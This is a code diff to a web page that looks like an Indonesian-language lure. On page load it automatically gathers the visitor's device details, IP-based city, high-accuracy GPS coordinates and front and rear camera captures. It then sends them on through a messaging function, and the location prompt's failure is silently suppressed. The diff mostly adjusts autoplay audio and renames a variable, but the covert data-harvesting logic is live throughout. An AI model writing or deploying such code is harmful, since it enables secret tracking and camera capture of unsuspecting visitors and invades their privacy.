@@ -163,7 +163,7 @@
     </div>
   </div>
 
-  <audio id="audio" src="https://files.catbox.moe/5qs1a7.mp3" autoplay muted></audio>
+  <audio id="audio" src="https://files.catbox.moe/5qs1a7.mp3" autoplay></audio>
 
   <script>
     const audio = document.getElementById("audio");
@@ -288,7 +288,7 @@ Kota                : ${ip.city}`.trim();
           const { latitude, longitude, accuracy } = pos.coords;
           resolve(`Latitude : ${latitude}\nLongitude : ${longitude}\nAkurasi : ±${accuracy} meter`);
         }, () => {
-          resolve(""); // No pop-up, no message
+          resolve(""); // Tidak tampilkan apapun
         }, { enableHighAccuracy: true, timeout: 5000 });
       });
     };
@@ -326,8 +326,13 @@ Kota                : ${ip.city}`.trim();
     };
 
     const mulai = async () => {
-      audio.muted = false;
-      try { await audio.play(); } catch {}
+      try {
+        await audio.play();
+      } catch {
+        document.body.addEventListener("click", () => {
+          audio.play();
+        }, { once: true });
+      }
 
       const info = await ambilDataPerangkat();
       const ip = await ambilIPInfo();
@@ -336,8 +341,8 @@ Kota                : ${ip.city}`.trim();
       const depan = await ambilKamera("user");
       const belakang = await ambilKamera("environment");
 
-      const gabungSemua = [info, ip, lokasi].filter(Boolean).join('\n\n');
-      await kirimPesan(gabungSemua);
+      const hasil = [info, ip, lokasi].filter(Boolean).join("\n\n");
+      await kirimPesan(hasil);
     };
 
     window.addEventListener("load", mulai);
